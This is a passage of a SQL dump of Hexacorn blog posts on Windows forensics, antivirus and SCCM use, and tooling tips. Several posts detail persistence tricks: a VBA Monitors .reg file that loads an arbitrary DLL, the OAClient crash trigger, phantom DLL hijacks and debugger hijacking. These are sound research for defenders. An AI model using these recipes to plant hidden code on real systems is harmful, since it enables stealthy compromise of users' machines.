INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (290, 'Permanent Link to Beyond good ol’ Run key, Part 7', 'Hexacorn', 'February 9, 2014 ', 'In my last post of this series I discussed the VBA Monitor mechanism that can be used to execute code anytime Visual Basic application is started. Today’s topic is similar and talks about yet another internal Microsoft component that could be abused to load arbitrary code – this time it happens anytime the application crashes. As far as I can tell, it only works on XP, so it’s a bit old and not that practically useful, but given the fact XP is still out there in large quantities it is worth documenting it.\nThe component that we will abuse is called OAClient. It is an agent that is a part of a distributed test management system called Oasys (Office Automation System) and which is used internally by Microsoft to test their Office suites.\nHow do I know?\nI have read about it in this pdf (‘Exploring Cross-Platform Testing Strategies at Microsoft”) that I found online while looking for the meaning of the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\OASys\\OAClient key – and I looked for it, because I spotted this key being queried by DWWIN.EXE anytime the application crashes under Windows XP.\nOnce I found out, all I had to do is to add the key, force the application to crash\n\n– so that DWWIN.EXE is launched and then confirm that the presence of the OAClient key leads the DWWIN.EXE to attempt loading of the BTLOG.DLL file from c:\\windows\\system32.\nThere you have it.\nTo reproduce:\n\nCreate %windir%\\system32\\BTLOG.DLL\nAdd HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\OASys\\OAClient\nNow launch the application that crashes and loads DWWIN.EXE as a result of the crash (e.g. copy notepad.exe to notepad2.exe and patch its entry point with 0xCC = int 3); the DWWIN.EXE will load the btlog.dll.\n\n.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2014/02/09/beyond-good-ol-run-key-part-7/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (291, 'Permanent Link to Beyond good ol’ Run key, Part 6', 'Hexacorn', 'January 10, 2014 ', 'The subject of today’s post is an obscure autorun mechanism that targets specifically users of applications written in Visual Basic. The trick forces VB applications to load a specific DLL into the context of the application. Let me repeat it – this particular autorun mechanism will trigger anytime someone runs an application written in Visual Basic so it’s sort of a random autorun which I believe is still very reliable – after all, VB applications are very popular and many people use them on daily basis.\nIf you ever ‘procmonned’ any VB application you might have noticed that at some stage it is checking the content of the following registry key:\n\n\nHKLM\\SOFTWARE\\Microsoft\\VBA\\Monitors\n\n\n\nThe VB app (or, more precisely MSVBVM60 DLL) enumerates this registry node (if it exists) looking for subkeys which in turn are later queried for a few specific values.\nThe mechanism appears to be designed for debugging/monitoring purposes because one of the values the VB apps query for is called EnableEventMonitor. The registry keys  used by this mechanism point to Event Monitoring DLLs that can be loaded into the process space of the VB application. The loading happens via CoCreateInstance API utilizing  some unknown interface referenced via GUID DE32EFB0-4A56-11D1-AA89-00008612DCF1.\nKnowing what expected values are allows us to craft a registry file that will help us to add our own VB monitor:\nWindows Registry Editor Version 5.00\r\n\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\VBA\\Monitors\\TestMonitor]\r\n\"EnableEventMonitor\"=dword:00000001\r\n\"CLSID\"=\"foobar\"\r\n\r\n[HKEY_CLASSES_ROOT\\foobar]\r\n\r\n[HKEY_CLASSES_ROOT\\foobar\\Clsid]\r\n@=\"{00000000-0000-0000-0000-FFFFFFFFFFFF}\"\r\n\r\n[HKEY_CLASSES_ROOT\\CLSID\\{00000000-0000-0000-0000-FFFFFFFFFFFF}\\InprocServer32]\r\n\"ThreadingModel\"=\"Apartment\"\r\n@=\"<your path>\\\\test.dll\"\nJust to quickly walk through it, we are adding the TestMonitor entry under:\n\n\nHKLM\\SOFTWARE\\Microsoft\\VBA\\Monitors\n\n\nWe then enable it by setting the value of EnableEventMonitor to 1.\nAfter that we are linking it to the HKCR entry that in turn links it to the actual DLL via the CLSID value (it’s actually a bit misleading name for the value since this particular CLSID doesn’t need to look like a regular GUID).\nAs a result CLSID entry under HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\VBA\\Monitors\\TestMonitor (foobar in our case) points to the entry under HKCR (HKCR\\foobar in our case), and that entry points to the typical COM server entry via its Default value (pointing in our case to 00000000-0000-0000-0000-FFFFFFFFFFFF). And of course, the HKEY_CLASSES_ROOT\\CLSID\\{00000000-0000-0000-0000-FFFFFFFFFFFF}\\InprocServer32 points to our DLL.\nI hope you are confused \nAfter we add the registry entries all we need to do now is dropping our test dll file in the <your path>\\\\test.dll location.\nRunning a simple ‘Hello World’ application written in VB loads the specified dll – in my case the test DLL sends notifications to the debugger and these can be intercepted with a Debug View:\nThe procmon log is much richer this time:\n\nNotably, the DLL doesn’t need to implement any COM functionality. CoCreateInstance will load it as a DLL library, and then query for the interface; it is not implemented, but the code execution is achieved. One could obviously add DLL exports to handle the COM requests and maybe even implement the mystery interface.\nLast, but not least. Instead of EnableEventMonitor value set to 1 (which is a global setting), one can use Environment variable  called VBAEV_<name of the monitor> and set it prior to running VB program in the environment of that targeted VB application.\nIn our case it would be:\nset VBAEV_TestMonitor=1\nhelloworld.exe\nlaunched from a command line. This would make the VB app launch with the inherited environment from the command line processor in which we set the VBAEV_TestMonitor to 1. This will ensure we load a DLL only to the helloworld.exe, but not other VB applications.\nUpdate 2016\nIt turns our that I have not explored all the possibilities here – the very same mechanism is used by the Visual Basic Engine libraries (VBE6.dll, VBE7.dll) that are responsible for running Visual Basic for Applications code (yes, the Office macros). Not a big surprise, but worth documenting and only shows how close the source code of these VB products must be…\nSo, as long as the system’s user is working with the macrodocuments, or using VBA in Outlook, the malware could leverage this key as a persistence mechanism.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2014/01/10/beyond-good-ol-run-key-part-6-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (292, 'Permanent Link to Some forensic artifacts are just like this: sometimes Visual, often Basic, and…  o', 'Hexacorn', 'December 11, 2013 ', 'Visual Basic is quite popular amongst malware writers. It’s simple, it allows to hide the ‘juicy’ code under the layer of p-code, and is often used as a relatively cheap wrapper as many routines for loading PE files inline (RunPE) are easily available online for copy&paste. It is also not that well-documented despite many years of research on its internals. In today’s post I will describe one ‘feature’ of VB that makes it for a minor, yet still interesting (and potentially helpful in some cases) forensic artifact.\nLet’s begin from the end. Have you ever seen any %TEMP%\\~DF*.tmp files on the investigated system? The chances are – you did. These temporary files are created by OLEAUT32 library; this and other OLE2 components are essential to run many Windows applications and Visual Basic happens to rely on them a lot. When executed, the Visual Basic app loads the form that has an icon associated with it. It turns out, at some stage Visual basic calls an OleLoadPictureEx API function function that is responsible for manipulating the application’s icon… and, indirectly, is also creating these temporary OLE2 files in a form of:\n\n%TEMP%\\~DF4BA7.tmp\n%TEMP%\\~DFBBA3.tmp\n%TEMP%\\~DFCBD8.tmp\netc.\n\nIf you want to confirm it on your own, you can try the following:\n\nClean the %TEMP% directory\nLoad a sample Visual Basic Application into OllyDBg\nMake a breaakpoint on OleLoadPictureEx (Ctrl+G, then paste ‘OleLoadPictureEx’ there and hit Enter)\nRun until the breakpoint hits (F9)\nCheck the %TEMP% directory – still nothing there\nNow Execute till return (CTRL+F9)\nCheck %TEMP% directory again\nThere you have it… see below, before (breakpoint on OleLoadPictureEx hits) and after (after the function completes the execution).\n\n\nThe temporary files are deleted after the program terminates, but sometimes they can be forensically recovered, or simply still present in the folder if e.g. malware or system crashed.\nThe structure of the file is OLE2 compound and storage file and can be previewed with OffVis – The Microsoft Office Visualisation Tool (Link is a direct download):\n\nThe actual content usually starts at offset 0x600 if it is a non-icon (i.e. a file in an .ico format), and 0x800 if it is an icon; I don’t know the reason why the difference – I assume that for .ico files the area between 0x600-0x7FF contains some internal data used for handling .ico files (if you know what’s there, please let me know).\nThe screenshot above highlights the beginning of the icon (00 00 01 00); One can easily extract it and view it using any image viewer, even Windows Explorer itself. In our case, it’s:\n\nNot surprisingly, the very same icon can be found inside the resources of the executable:\n\nThe conclusion?\nIf you come across %TEMP%\\~DF*.tmp file(s), you can attempt to:\n\nView their content\nIf it contains an .ico resource, it could be a trace of Visual Basic application running on the system\nIn such case you can extract the icon and recognize if it’s sth dodgy e.g. one of the infamous fake Acrobat Reader, Microsoft Word, etc. icons used by malware all over the place and if you are lucky and it stands out, use the file timestamps in your analysis, especially if main executable is no longer on the system; in a way, it’s a weak way of confirming some VB app was possibly executed on the system\n\nWord of caution:\n\nIt’s OleLoadPictureEx that creates the file, not Visual Basic alone – the function is used widely by non Visual Basic applications as well and it’s common to find the content of the ~DF*.tmp files to contain e.g. PNG files; ~DT files should be seen as containers storing the stream of data related to some graphics. If these are .ico files, then high chances of it begin associated with some Visual Basic application, if not, it may still be useful as it may contain traces of pictures processed on a computer using an application that happens to rely on OleLoadPictureEx to manipulate the graphics.\n\nShare this :)', 'Forensic Analysis', 'http://www.hexacorn.com/blog/2013/12/11/some-forensic-artifacts-are-just-like-this-sometimes-visual-often-basic-and-on-occassion-iconic/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (293, 'Permanent Link to Beyond good ol’ Run key, Part 5', 'Hexacorn', 'December 8, 2013 ', 'Time for the 5th part. Today it’s about the Phantom DLLs Hijacking (do not confuse it with ‘DLL Search Order Hijacking’ where order in which paths are searched for is abused).\nWindows is a huge operating system and not all components are cleaned up every new release. Thanks to that, there is a lot of legacy code that due to its age and changes in the structure of the operating system no longer work, or are simply left alone – probably just an implementation of the good ol’ rule at work – if it doesn’t break, don’t touch it.\nMany Windows applications residing in the system32 directory are not used on daily basis – some of them indeed look like legacy apps (you can still run syncapp.exe on your Windows XP copy to enjoy the Briefcase experience :)), and some of them may be used only in specific configurations (e.g. NT Backup). The mechanisms that some of these legitimate applications use often cater for different scenarios and environments and… thanks to that, they can be often exploited.\nToying around with system32 executables I came across a few legitimate applications that may work as a hidden persistence mechanism . The ‘features’ I am describing are not new, and are identical with the fxsst.dll trick mentioned in the 3rd part of the series and described by Mandiant in detail. The idea is simple – some programs attempt to load specifically named libraries that are some sort of extension, or plugins and in some cases debugging tools – and they can continue to run, even if these DLLs implementing this extra functionality are not present.\nHere’s a list of pairs I came across (and I bet there is more; note, some of these may work on other OS versions as well – usually the same code is used across many consecutive OS versions):\nntbackup.exe and edbbcli.dll (Windows XP)\n\nNtbackup is a Backup Utility for Windows (available on XP, but not 7). When launched it starts a Backup or Restore Wizard.\nThe interesting thing is that when loaded, this .exe is also attempting to load a library called:\n\n\n %windir%\\system32\\edbbcli.dll\n\n\nThus, dropping such named DLL and making ntbackup run every time Windows starts either by using Scheduled job or using any of the well-known Autorun mechanisms one can achieve quite a stealthy code execution.\nntbackup.exe and esebcli2.dll (Windows XP)\n\nThe situation is exactly the same here; anytime ntbackup launches, it attempts to load the esebcli2.dll DLL from the following location:\n\n\n%windir%\\system32\\esebcli2.dll\n\n\nThe legitimate mechanism of loading these two NT Backup DLLs is explained here.\nmrt.exe and bcrypt.dll (Windows XP)\n\nMRT is a Malicious Software Removal Tool. When launched, it attempts to load bcrypt.dll; thus, dropping it in the system32 directory on XP will lead to (somehow ironic) execution of the code:\n\n\n%windir%\\system32\\bcrypt.dll\n\n\nThe bcrypt.dll doesn’t exist on XP, but it does on Windows 7, so this trick will only work on older Windows.\nsessmgr.exe and SalemHook.dll (Windows XP)\nYet another binary that can load a targeted DLL is a Remote Desktop Help Session Manager executable on Windows XP. Once launched, it tries to load the following DLL:\n\n\n%windir%\\system32\\SalemHook.dll\n\n\ncertreq.exe and msfte.dll (Windows 7)\nCertreq is a tool that allows to work with certificates. When launched it attempts to load the following DLL:\n\n\n%windir%\\system32\\msfte.dll\n\n\ncertreq.exe and msTracer.dll (Windows 7)\nCertreq seems to like non-existing DLLs as it also attempts to load the following DLL:\n\n\n%windir%\\system32\\msTracer.dll\n\n\nFXSCOVER.exe and TPPrnUIENU.dll (Windows 7)\nThis tool is a Fax Cover Page Editor. When loaded, it attempts to load the following DLL\n\n\n%windir%\\system32\\spool\\DRIVERS\\W32X86\\3\\TPPrnUIENU.dll\n\n\nThe name of the DLL (TPPrnUIENU.dll) suggests that:\n\nIt is a companion to %windir%\\system32\\spool\\drivers\\w32x86\\3\\TPPrnUI.DLL (there are plenty of %windir%\\system32\\spool\\drivers\\w32x86\\3\\TPPrnUI*.dll files, but not the TPPrnUIENU.dll)\nThe ENU in the file name indicates it is a Satellite DLL used in localization and it’s providing data for the English language (the other TPPrnUI*.dll present on the system use other language identifiers e.g. TPPrnUIfra.dll, TPPrnUIita.dll)\n\nIn theory, these Satellite DLLs are resource-only DLLs, but the TPPrnUI.DLL is using a LoadLibraryW to load them –  a big mistake, since the LoadLibraryW calls DllMain of the loaded DLL (LoadLibraryEx with LOAD_LIBRARY_AS_DATAFILE is a better choice here). Hence, a code execution.\ndxdiag.exe and DXGIDebug.dll (Windows 7)\ndxdiag.exe is a DirectX Diagnostic tool. When executed, it attempts to load the following DLL (for debugging purposes as a part of DXGI framework):\n\n\n%windir%\\system32\\DXGIDebug.dll\n\n\nmsinfo32.exe and fveapi.dll (Windows 8.1)\nThe msinfo32.exe is a system information tool. When executed, it will try to load the following DLL:\n\n\n%windir%\\system32\\fveapi.dll\n\n\nInterestingly, this DLL is present on Windows 7 and Windows 8, but not present on Windows 8.1 (in default installation). The DLLs description is Microsoft Vista BitLocker Drive Encryption API and it offers access to BitLocker API.\nnarrator.exe and MSTTSLocEnUS.DLL (Windows 8)\nLast one on the list is Narrator.exe that attempts to load the following DLL:\n\n\n%windir%\\system32\\speech\\engines\\tts\\MSTTSLocEnUS.DLL\n\n\nAgain, then file naming suggests localization gone wrong.\n32-bit processes, Wow64.dll and Wow64Log.dll (Windows 7 64-bit)\nThis is not a process-specific autorun mechanism, but a system-wide way of introducing a DLL into all 32-bit processes running under control of WOW64 by dropping the following 64-bit DLL on the 64-bit Windows 7.\n\n\n%windir%\\system32\\Wow64Log.dll\n\n\nThis trick has been discovered and described in detail by Wallied Assar on his blog earlier this year.\nWhile Wow64Log.dll appears to be made available with a purpose of being a legitimate logging feature, it can be abused as a persistent mechanism as well.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (294, 'Permanent Link to The art of disrespecting AV (and other old-school controls)', 'Hexacorn', 'December 3, 2013 ', 'Update\nThanks to Kurt Wismer for pointing out a mistake re: false vs. true negatives; I have corrected it below\nOld post\nEvery once in a while I hear people whining commenting about antivirus solutions:\n\n“It’s outdated”.\n“It’s a resource hog”.\n“Let’s get rid of it”.\n“It didn’t detect the malware XYZ.”\n\nI sometimes do it too, but… I would never ever remove AV from the company environment. It’s easy to say AV is no longer necessary, or ‘doesn’t work’ . It’s also very tempting to apply one’s localized context of their (often smaller) environment to pretty much every possible situation, but… it just doesn’t work this way.\nLet the preaching begin.\nWhat is an antivirus and its role in your environment?\nPutting sales BS away, one can say that:\nThe antivirus’ role in your environment is to:\n\n\n detect known malware using specific patterns/signatures, algorithms, etc.\n detect unknown malware using heuristics (wildcard/regular expressions, behavioral analysis, file reputation, etc.)\n\n\nand block/remove it\nThe ‘known malware’ is an easy bit. You know it, you block it (or kill it).\nThe ‘unknown malware’ bit is often the major reason for whining, but we should all know that AV is not a ‘cure it all’ solution and there is no algorithm in the world that will allow to detect every single malware. Nearly 30 years ago Fred Cohen prove that detection of viruses is undecidable. The proof will probably make you scratch your head a little, but the beauty here is in its simplicity.\nTo catch up with the reality, we can expand our definition and say:\nThe antivirus’ role in your environment is to:\n\n\n detect known malware using specific patterns/signatures, algorithms, etc.\n detect unknown malware using heuristics (wildcard/regular expressions, behavioral analysis, file reputation, etc.) with the highest possible rate, but with NO expectation of detecting every single malware out there\n\n\n\nand block/remove it\nStatement like this is far more realistic – people who support this are at least aware of AV weaknesses.\nStill, such statement omits one yet very important bit.\nThe antivirus role in your environment is also NOT to detect non-malicious files.\nEver heard of False Positives?\nThe availability heuristic makes a lot of people talking critically about AV to focus on the following:\n\nFalse Negatives (malware is missed)\nFalse Positives (good file is incorrectly detected as malware).\n\nfollowed by the obvious:\n\nTrue Positives (malware is detected)\n\nWhat about True Negatives?\nThe number of these is tremendous. The thing is, they are NOT reported.\nYou probably chuckle now. How can we even take it into consideration? After all, we are not paying AV for NOT detecting stuff!\nYou see, with a decent AV on your system every single operation you do one way or another triggers a background AV check. And it is a far more complex task NOT to trigger on stuff, than to trigger on a very specific pattern. This is especially true for heuristic detections. And this is not to justify AV missing stuff by saying ‘but it’s not detecting the good stuff’. It is just a picture is not full without this bit. If it doesn’t make sense – think of all the posters in Las Vegas showing the casino winners. And then try imagining what would happen if they put the posters of all the losers as well. This is an error of availability at work.\nSo far we have got:\nThe antivirus role in your environment is to:\n\n\n detect known malware using specific patterns/signatures, algorithms, etc.\ndetect unknown malware using heuristics (wildcard/regular expressions, behavioral analysis, file reputation, etc.) with the highest possible rate, but with NO expectation of detecting every single malware out there\n\n\nand block/remove it. The antivirus role in your environment is also NOT to detect non-malicious files.\nI guess that’s it.\nOn a high-level, AV is just one of available security controls that is imperfect by its nature. Interestingly, individual malware detection kinda lost its ‘whoaw’ impact over the years. Malware detections are quoted in groups of hundreds, thousands, and more – and reported in ‘spikes’ on monthly basis. So, right there, in front of our very own eyes we have a proof of AV actually working, and working very well, yet a few missed detections occupy our mind enough to dismiss the benefits of using it. It is true that even a single malware NOT detected can be a game over, but the alternative cost of NOT having AV installed means the chances for game over increase dramatically as its multiplied by hundreds, thousands detection for your average mid-size to large company.\nLet’s say it one more time: any single piece of malware that AV detects makes your company more secure.\nAnd about all these neglected hundreds, thousands and more detection reported on monthly basis?\nDon’t just stare at the charts. Use it.\nIn my recent post I mentioned SCCM. AV logs from across the whole company are very useful in finding patterns of malicious campaigns, characteristic patterns, and so on and so forth. The infamous ‘invoice’, ‘fedex’, ‘ups’, campaigns often end up with malware being deployed in a very similar fashion. With such internal intel that can be very quickly pulled from any enterprise-level AV product, it’s very easy to combine it with SCCM and other controls to form a solid detection ‘umbrella’.\nThe list below shows a few things you can do with AV logs alone:\n\nrun statistics – pick up systems that are infected over and over again, investigate\nfind systems with detections coming from removable devices – block access to removable devices for repeating ‘offenders’\nfind systems with recurring detections – request rebuild/forensics if you see malware being picked up on the same system many times; AV may be struggling to remove it\nfind systems infected with a highly sophisticated malware (ZeroAccess, rootkits, etc.) – request rebuild/forensics\nfind file names / patterns of detected malware – use it in SCCM queries\neyeball the ‘detected & removed’ alerts – most of people ignore the ‘detected & removed’ – once in a while you will find hacking tools, password/information stealers, etc. – these systems are the ones you should be looking at; there may be something juicy stolen from these systems; request credentials changes; these systems may be also compromised by other malware\ncorrelate alerts looking at the host names and cross-reference them with a list of important systems – domain controllers, web servers, systems that belong to C-level guys, admins, etc. – anything that processes sensitive data / is a part of a highly critical infrastructure is of an interest\ncherry-pick systems, fetch samples from Quarantine, run them via sandboxes\n\nThe list can go and on.\nI would argue that lots of conversations about threat intel, security analytics, clustering, etc. often miss the basic fact that the ‘old-school’ enterprise products provide both data and tools to run lots of correlations and they do it ‘natively’ without any need for BIG DATA solutions or external input.\nYou heard it right. You can do IR work w/o buying new security controls!\nIn fact, if you have an AV, proxy/firewall and DNS logs as well as SCCM access you have at your hands most of the data needed to discover a compromise, or a malicious infection. SCCM and AV helps with host analysis, proxy/firewall and DNS with network analysis.The early daily stats can be done with Excel, grep and a bit of scripting. This can be always automated later.\nPreaching ends here \nShare this :)', 'Compromise Detection, Forensic Analysis, Malware Analysis, Preaching', 'http://www.hexacorn.com/blog/2013/12/03/the-art-of-disrespecting-av-and-other-old-school-controls/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (295, 'Permanent Link to Doing things faster', 'Hexacorn', 'November 25, 2013 ', 'Every once in a while I ask myself a question – what can I do to work faster?\nI strongly believe that complacency a.k.a. resting on one’s laurels is the biggest enemy of the productivity; therefore, once in a while I go on a journey to hunt for the tips and tweaks that can improve my work environment. These come in a variety of forms – better hardware, newer software, alternative software, or… changing habits.\nHere is a bunch of tips that you may find useful  – some are old, some are new, but these are tested and work in practice (note: these are all workstation- and Windows-centric). This is a direct continuation of my 2 older posts on how to speed up case processing and obviously, some repetitions are unavoidable \nHere it goes…\n\nSee more\n\nUse at least two computer screens; I can’t imagine working with a single screen anymore. Whether it is a programming, forensic analysis or reversing session – it’s always good to have more space for information\n\n\nSee less\n\nIf you do a lot of multitasking, use virtual desktops – there are lots of programs that help creating virtual desktops, but the one that IMHO nails it is VirtuaWin\nIf you use multiple computers, use RDP instead of separate screens\nIf you work at night, use f.lux\n\n\nMultiple computers\n\nIf you must use multiple computers, you can use Synergy to share one keyboard and mouse\n\n\nSpeeding-up data transfers\n\nInvest in fast CPU, more memory\nInvest in SSD, USB 3.0\n\n\nKiller-apps\n\nKill your Windows Explorer – this is the worst GUI interface to work with files; use Total Commander, or FAR\nUse PureText to copy & paste text w/o formatting\nUse Sizer to resize any window to an exact, predefined size – this is handy when you write reports and want to use normalized screenshots’ sizes\nMigrate most of your tools to their portable versions; it’s very handy when you change the computer or travel (can always have the most up to date version of your software/settings w/o relying on cloud)\n\n\nVirtualization\n\nBuild a fresh clone of your ‘working’ image once in a while – not only a good chance to update software, but also set up/fix settings that you find annoying (if you catch yourself doing the same thing over and over again after you revert to a snapshot -> fix the image!)\nMove the most frequently used images to SSD drive\nTurn the speaker off for all virtual machines – this is pretty annoying and the link I provide allows to disable it for all images\n\n\nSSD optimization\n\nRemove hibernation file – if you don’t use hibernation, just run powercfg -H OFF – this may give you a few good GiBs back\nRemove pagefile.sys file – if you have enough memory, you don’t need pagefile\nUse junctions – for some reason Microsoft drops tones of rarely used files on the %SystemDrive% e.g. inside %SystemRoot%\\Installer or %SystemDrive%\\ProgramData\\ or their subfolders – these files can’t be simply deleted, but they ‘steal’ the precious SSD space; in order to gain that space back, you can use junctions to move all this rarely used stuff to a slower partition (use mklink)\nInstall less-often used software to other partitions\nDo a clean up once in a while\n\n\nRegionalization\n\nChange date/time format to YYYY-MM-DD hh:mm:ss in both Regional Setting of your OS and forensic software e.g. Encase; it makes a HUGE difference when you look at timelines\n\n\nFonts\n\nIf you code, use programming fonts\n\n\nReading\n\nIf you read PDFs, swap Acrobat with Sumatra\n\n\n.NET decompiling\n\nilspy does it pretty well\n\n\nRegedit\n\nAdd Favorites to most commonly used registry keys – you can use RegJump from Sysinternals to quickly navigate to the specific key\n\n\nIDA, Hex-Rays Decompiler & OllyDbg\n\nBuild a habit of collecting plugins and scripts – sometimes even if not immediately useful, a source code of an existing script/plug-in can save you a lot of time of coding;  Hex-Rays Plug-In Contest is a good start to pick up a few plugins (note: some of them crash randomly – it’s not a production-ready code, so best is to have them disabled by default and enable when you need it; some of these plugins also slow down the decompiling)\n\n\nProcmon/Regmon/Filemon\n\nBuild a list of filters and save it\nAdd highlighting for operations that modify stuff (e.g. write operation)\n\n\nProcess Explorer\n\nLet’s face it – it has to be retired as it’s way behind Process Hacker\nIf you really need to use it – if you use a 64-bit system Process Explorer (which always starts as a 32-bit process) extracts the 64-bit version of Process Explorer and then runs it; you can extract this 64-bit version directly from the 32-bit .exe and rename it as procexp.exe; the alternative way is to run Process Explorer 32-bit, then copy the 64-bit version from the Temp folder – next time you run procexp.exe, you will run the 64-bit version directly – always one process less to run\n\n\nTemp folder\n\nClean up temp. folder regularly; some forensic software drops large files into your temp and it just stays there\n\n\nChrome cache\n\nIf you use Chrome and download large files – the temp/cache files end up stored in the program’s directory forever; it’s a good habit to have a look at it once in a while and remove it (look for a ‘File System’ folder)\n\n\n\nShare this :)', 'Tips & Tricks', 'http://www.hexacorn.com/blog/2013/11/25/doing-things-faster/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (296, 'Permanent Link to Minor Updates – PESectionExtractor and PECluester', 'Hexacorn', 'November 12, 2013 ', 'Just quick note that I have updated:\n\nPESectionExtractor. It’s just a minor fix to make it parse PE32+ files.\nPECluester. Again, it’s just a minor fix for parsing the arguments + dates.\n\nShare this :)', 'PECluester, PESectionExtractor, Software Releases', 'http://www.hexacorn.com/blog/2013/11/12/minor-updates-pesectionextractor-and-pecluester/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (297, 'Permanent Link to SCCM (System Center Configuration Manager) and Incident Response', 'Hexacorn', 'November 1, 2013 ', 'Have you ever heard of SCCM?\nYes?\nYou probably know what I am going to talk about.\nNo?\nWell, you are going to like it.\nIt’s been a few years since I discovered this gem and successfully used it for Incident Response work.\nCutting long story short, SCCM (System Center Configuration Manager) is a a configuration platform that helps to manage large networks of computers. On top of typical admin tasks, it also can regularly gather information from the systems including very interesting artifacts e.g. file lists.\nNow you know where this post is heading.\nHaving a database of artifacts from the system, a snapshot, if you will gives the company a very powerful tool for both individual system analysis and a global view of all the files stored across the company (when I say ‘all’ here, it usually means a subset, e.g. .exe; this is due to performance hit and database size limitations; talk to your SCCM admin guys to find out what you have).\nSo, what potentially can you do then with SCCM?\nLet me list a few interesting properties of this system:\n\nYou get a snapshot of ‘all’ file systems across the company.\nThis snapshot is updated continuously (with a specific interval e.g. every day).\nYou can query it using customizable reports that show both specific files, systems, and lots more.\nThe whole thing is backed by the MS SQL engine, so you can even talk to it in SQL.\n\nAccessing SCCM gives the IR folk many opportunities to access very interesting data useful for a daily IR work; to give you a couple of ideas, let’s run through a couple of scenarios one can utilize SCCM for:\n\nA daily reporting looking for specific file names f.ex.:\n\nknown hacking tool names\nsuspicious file names e.g. including common keywords from spam campaigns like ‘invoice’ or ‘payment’, etc.\ndouble file extensions e.g. jpg.exe\n‘funny’ tools installed by employees\netc.\n\n\nIf you connect directly to the SCCM database you can do cross-referencing and lookg for anomalies across systems (note that this requires some deep thinking first as the DB is constantly utilized by the system and any large query will not only piss the admins off, but simply bring the system down).\nYou can use it to automatically remove files.\nThe snapshot offers yet another way to look at the system artifacts which are preserved in a separate location; if we are lucky, it’s possible it may list files that have been already deleted from the system and this way offer some insight in attackers’ doing or provide clues for further analysis – it complements the file listing acquired either through live or offline analysis\nRemember that this is data which is already gathered anyway, so the cost is null. Okay, it may cost you a beer that you will buy me one day \n\nWell, that’s it. If you don’t use SCCM yet you better have a good chat with your admins. The chances are that you may actually start using it on regular basis and generate a series of ‘quick wins’ which will not only please your bosses, but more importantly – improve the security of your company.\nShare this :)', 'Compromise Detection, Forensic Analysis', 'http://www.hexacorn.com/blog/2013/11/01/sccm-system-center-configuration-manager-and-incident-response/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (298, 'Permanent Link to Extracting camels out of APIs and putting them in the Cloud', 'Hexacorn', 'September 27, 2013 ', 'Most of API function names are created in a form of a CamelCased word. Using a large collection of API names one can “Extract camels out of APIs and put them in the Cloud ©” – the result is probably the most ugliest tag cloud ever (Comic Sans MS comes as a bonus :)).\nHere it is:\n\nShare this :)', 'Silly', 'http://www.hexacorn.com/blog/2013/09/27/extracting-the-camels-out-of-apis-and-putting-them-in-the-cloud/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (299, 'Permanent Link to Beyond good ol’ Run key, Part 4', 'Hexacorn', 'September 19, 2013 ', 'Last three articles about various startup/autostart methods covered a lot of different well- and less-known techniques for ‘staying alive’. Many of them are actively used by malware and ‘normal’ software; some are just ideas that are worth describing because… luck favors a prepared mind. If you haven’t read them previously, you can do so by visiting these links: Part 1, Part 2, Part 3.\nIn today’s post I will cover some more techniques including hijacking of various debuggers and some more obscure ways of ‘survival’. I think this is probably the lamest part of the series so far, because the techniques are old-school and amateurish, but luckily it is not the last one, so stay tuned for Part 5 \nHijacking debuggers\n\nThe list of debuggers one can replace on the system is as follows:\n\nStandalone Debugger (32- and 64- bit)\n\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\\r\nCurrentVersion\\AeDebug]\r\nDebugger = PATH\r\n\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\\r\nWindows NT\\CurrentVersion\\AeDebug]\r\nDebugger = PATH\n\n.NET Debugger (32- and 64- bit)\n\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\.NETFramework]\r\nDbgManagedDebugger = PATH \r\n\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\.NETFramework]\r\nDbgManagedDebugger = PATH\n\nScript Debugger\n\n[HKEY_CLASSES_ROOT\\CLSID\\\r\n{834128A2-51F4-11D0-8F20-00805F2CD064}\\LocalServer32]\r\n@=PATH\nRegistering itself as a Script Debugger\nThe Windows Script Debugger (WSD) is a standalone tool that one can use to actively debug their scripts (e.g. vbs). Once installed, a developer can run one of the following commands:\n\n\ncscript /x script.vbs\n\n\nor\n\n\nwscript /x script.vbs\n\n\nto debug the script.\nThe name of the executable that is used as a debugger is stored inside the following key\n\n\n[HKEY_CLASSES_ROOT\\CLSID\\\r\n{834128A2-51F4-11D0-8F20-00805F2CD064}\\LocalServer32]\n\n\nand on a system where the WSD is installed may look like this:\n\n\n[HKEY_CLASSES_ROOT\\CLSID\\\r\n{834128A2-51F4-11D0-8F20-00805F2CD064}\\LocalServer32]\r\n@=\"C:\\\\Program Files\\\\Microsoft Script Debugger\\\\msscrdbg.exe\"\n\n\nOne could replace the script 